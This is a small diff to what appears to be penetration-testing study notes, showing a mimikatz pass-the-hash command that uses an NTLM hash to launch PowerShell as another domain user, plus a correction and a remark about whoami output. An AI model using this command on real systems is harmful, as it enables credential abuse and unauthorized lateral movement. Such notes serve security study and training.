@@ -44,7 +44,9 @@ let's do this with mimikatz
 
     mimikatz# sekurlsa::pth /user:jim /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
 
-this allows us to run a powershell process as jen 
+this allows us to run a powershell process as jim
+
+### NOTE whoami might show the original user but we are still jim
 
 now in the PS prompt
 
